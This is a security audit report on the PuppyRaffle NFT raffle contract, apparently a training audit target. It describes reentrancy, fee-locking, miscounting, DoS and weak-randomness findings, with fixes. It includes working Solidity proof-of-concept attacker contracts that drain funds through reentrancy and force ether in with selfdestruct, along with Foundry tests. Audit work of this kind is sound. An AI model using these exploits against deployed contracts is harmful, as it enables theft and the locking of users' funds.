# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Severity Criteria](#severity-criteria)
  - [Summary of Findings](#summary-of-findings)
  - [Tools Used](#tools-used)
- [High](#high)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary
This project is to enter a raffle to win a cute dog NFT.

# Disclaimer
The zxarcs team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification
|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details

## Scope
- Commit Hash: 22bbbb2c47f3f2b78c1b134590baf41383fd354f
- In Scope:
```
/src/PuppyRaffle.sol
```

## Summary of Findings
* Checks-effects-interactions pattern is not properly implemented. Because of this, funds can be drained via reentrancy attack.
* Using strict equality in `withdrawFees` function can cause accumulated fees to be forever stuck in the contract.
* Players that got refunds are not considered when calculating prize pool and fee pools. This leads those calculations to be bloated and when the contract tries to send out the funds, the transaction will fail as not enough funds are available.
* If there are many entrants to a raffle, looping over unbound arrays to check for duplicate entries can cause DoS via gas limits. Raffle contract interactions such as entering a raffle could also be prohibitively expensive to perform.
* `selectWinner` function uses randomness made out of only on-chain data pieces. Using on-chain data pieces as only source of randomness leads to exploitable and weak randomness

## Tools Used
- Foundry
- Manual audit

# High

## Not implementing checks-effects-interactions pattern properly, funds can be drained via reentrancy attack

### Summary
Checks-effects-interactions pattern is not properly implemented. Because of this, funds can be drained via reentrancy attack.

### Details
A malicious user can enter the raffle with an address of a contract. After entering the raffle, this contract would then call the `refund` function to get a refund. The contract would have a `receive` function that would again call the `refund` function. This reentrancy attack is possible because the `refund` function only updates the `players` array after it sends the funds to the address requesting refund.

### Filename
`src/PuppyRaffle.sol`

### Permalinks
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L100-L103

### Impact
Reentrancy attack can drain ether from the contract.

### Recommendations
Update the players array before sending ether.
```diff
+	players[playerIndex] = address(0);
	payable(msg.sender).sendValue(entranceFee);
-	players[playerIndex] = address(0);
```

### Tools Used
* Manual Audit
* Foundry

### POC
Create a new attacker contract below.

> Note: this is just a POC contract. It is beyond scope of this POC to ensure this attack contract is written securely and that funds are handled correctly once the contract has them.
```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract MaliciousContract {
    uint256 playerIndex;
    PuppyRaffle raffle;

    constructor(address _raffleContract) {
        raffle = PuppyRaffle(_raffleContract);
    }

    receive() external payable {
        // code execution enters here when refund is sent
        uint256 currentBalance = address(raffle).balance;

        // ask for a refund again
        // this enters the raffle contract in a loop where we continue to
        // get refunds until there is 1 ether or less left in the refund contract
        if (currentBalance >= 1 ether) {
            raffle.refund(playerIndex);
        }
    }

    function getFunds() external payable {}

    function attack() external {
        // create player array to enter raffle
        address[] memory players = new address[](1);
        players[0] = address(this);

        // enter raffle as the contract
        raffle.enterRaffle{value: 1 ether}(players);

        // get our index in the players array
        playerIndex = raffle.getActivePlayerIndex(address(this));

        // ask for a refund
        raffle.refund(playerIndex);
    }
}
```

And the test function.
> Note: this test function is to be added to the existing test suite as it needs already existing components from there.
```solidity
import {MaliciousContract} from "../src/MaliciousContract.sol";
// ...
function testRefundCanDrainFunds() public playersEntered{
	address attacker = address(101);
	vm.deal(attacker, 2 ether);
	
	vm.startPrank(attacker);
	MaliciousContract maliciousContract = new MaliciousContract(address(puppyRaffle));
	maliciousContract.getFunds{value: 1 ether}();
	maliciousContract.attack();
	vm.stopPrank();
	
	// 5 ether because 5 participants entered: 1 attacker + 4 regular users.
	assertEq(address(maliciousContract).balance, 5 ether);
}
```

## Using strict equality can cause accumulated fees to be forever stuck in the contract
###  Summary
Using strict equality in `withdrawFees` function can cause accumulated fees to be forever stuck in the contract.

###  Details
The `require` function in `withdrawFees` uses a strict equality check:
```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

This check can be made to always fail by sending a small amount of ether directly to the smart contract address. This will make `address(this).balance` part of the check be greater than the `uint256(totalFees)` part of the check.

Even though the raffle contract only has one `payable` function which also has a hard requirement on funds that can be sent, there are other ways funds can be sent to the contract.

This exploit uses the `selfdestruct` function of a malicious contract. This contract receives funds from the attacker and then calls `selfdestruct` and provides `puppyRaffle` contract as the recipient of the ether.

This tiny amount of extra funds will cause `address(this).balance` of `puppyRaffle` contract to be greater than its `uint256(totalFees)` amount and therefore the check below will always fail and funds will be locked.
`require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");`

###  Filename
`src/PuppyRaffle.sol`

###  Permalinks
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol### L158

###  Impact
Fee funds can not be withdrawn from the smart contract.

###  Recommendations
Do not use strict equality, instead use an inequality.
```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+ require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!"); 
```

###  Tools Used
* Manual Audit
* Foundry

###  POC
Create a new attacker contract below.

> Note: this is just a POC contract. It is beyond scope of this POC to ensure this attack contract is written securely and that funds are handled correctly once the contract has them.
```solidity
// SPDX-License-Identifer: MIT
pragma solidity ^0.7.6;

contract Destructible {
    receive() external payable {}

    function forceSendEthToContract(address payable fundsTo) external {
        selfdestruct(fundsTo);
    }
}
```

And the test function.
> Note: this test function is to be added to the existing test suite as it needs already existing components from there.
```solidity
import {Destructible} from "../src/Destructible.sol";
// ...
function testWithdrawFeesCanGetLocked() public playersEntered {
	// move blockchain forward so that the raffle can complete
	vm.warp(block.timestamp + duration + 1);
	vm.roll(block.number + 1);

	// set up the attacker
	address attacker = address(101);
	vm.deal(attacker, 1 ether);

	vm.startPrank(attacker);
	console.log("puppyRaffle balance before", address(puppyRaffle).balance);
	// send ether to attacking contract and then destroy that contract
	// this will send funds to the raffle contract, bypassing the check
	// on its only payable function
	Destructible destructible = new Destructible();
	address(destructible).call{value: 0.00001 ether}("");
	destructible.forceSendEthToContract(payable(address(puppyRaffle)));
	// raffle contract now has more funds than the `totalFees` state variable thinks
	console.log("puppyRaffle balance after", address(puppyRaffle).balance);
	vm.stopPrank();

	uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;
	// end raffle
	puppyRaffle.selectWinner();

	vm.expectRevert("PuppyRaffle: There are currently players active!");
	// project owners can never withdraw their funds because if the hard equality
	// on address(this).balance == uint256(totalFees)
	puppyRaffle.withdrawFees();
}
```

## Not accounting for players that get refunds leads to wrong calculations, higher fee and winner payout costs and failed payout transactions

###  Summary
Players that got refunds are not considered when calculating prize pool and fee pools. This leads those calculations to be bloated and when the contract tries to send out the funds, the transaction will fail as not enough funds are available.

###  Details
When selecting a winner, in `selectWinner` function, the code does not take into consideration users that might of got a refund. `totalAmountCollected` is calculated by multiplying the `players` array length and the `entranceFee`
$$ totalAmountCollected = players.length * entranceFee $$

When a player gets a refund, their address in the `players` array gets changed to the zero address and their entrance fee gets returned to them. This is not taken into consideration in the `selectWinner` function.

###  Filename
`src/PuppyRaffle.sol`

###  Permalinks
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol### L131-L133

###  Impact
Wrong calculations for:
* `totalAmountCollected`
* `prizePool`
* `fee` and `totalFees`

Contract will try to send more funds that it has and those transactions will fail.

###  Recommendations
In addition to checking that there is at least 4 players for the raffle, It is also recommended to make sure that the total players *does not* include any zero addresses which represents players that got refunds. A new array could be created with this count and only the non zero addresses should be populated to the new array. Then safely loop over that array.

Instead of using `players.length` to get total valid players use something similar to below. Which only counts the non-zero-address players.
```solidity
uint256 validPlayers;
for (uint256 i = 0; i < players.length; i++) {
	if (players[i] != address(0)) {
		validPlayers++;
	}
}
```

###  Tools Used
* Manual Audit
* Foundry

###  POC
```solidity
address[] memory refflePlayers = new address[](4);
refflePlayers[0] = address(8);
refflePlayers[1] = address(9);
refflePlayers[2] = address(0); // this player got a refund and should not be counted in total players count
refflePlayers[3] = address(10);
uint256 validPlayers;
for (uint256 i = 0; i < refflePlayers.length; i++) {
	if (refflePlayers[i] != address(0)) {
		validPlayers++;
	}
}
console.log("valid players", validPlayers); // 3
```

# Medium

## Looping over unbound arrays when checking for duplicates can cause denial of service (DoS) via gas limits

### Summary
If there are many entrants to a raffle, looping over unbound arrays to check for duplicate entries can cause DoS via gas limits. Raffle contract interactions such as entering a raffle could also be prohibitively expensive to perform.

### Details
Each block in the Ethereum blockchain can has a certain gas limit (currently it's 30 million gas). If there are many entrants to the raffle and every single entry causes `enterRaffle` function to go through a nested loop with length of `players.length` (when checking for duplicates) this could, in certain situations, lead to block gas limit being exhausted and transactions failing.

### Filename
`src/PuppyRaffle.sol`

### Permalinks
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L86-L90

### Impact
Transactions failing due to block gas limit being hit. Entering a raffle could be very expensive.

### Recommendations
Reconsider having code to check for duplicates. Even with this check in place, anyone can just use another of their addresses to enter with so having a check for duplicates is superfluous and easily worked around.

### Tools Used
* Manual Audit
* Foundry

# Low

## Using on-chain data pieces as only source of randomness leads to exploitable and weak randomness
### Summary
`selectWinner` function uses randomness made out of only on-chain data pieces. Using on-chain data pieces as only source of randomness leads to exploitable and weak randomness

### Details
`selectWinner` function uses randomness made out of only on-chain data pieces.
```solidity
uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```
This is not a good source of randomness because on-chain data can be modified by multiple parties (e.g. the user, the miners, etc.)

Since this code is visible publicly, anyone (that possesses enough knowledge and power) can modify certain aspects of the transaction to get the outcome they want.

### Filename
`src/PuppyRaffle.sol`

### Permalinks
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L128-L129

### Impact
Blocks and transactions can be modified in such a way as to guarantee outcomes wanted.

### Recommendations
It is recommended to not make randomness dependent on on-chain data pieces such as block timestamp or difficulty. Consider generating random numbers by using something like Chainlink VRF instead.

### Tools Used
* Manual Audit
* Foundry


# Informational

# Gas
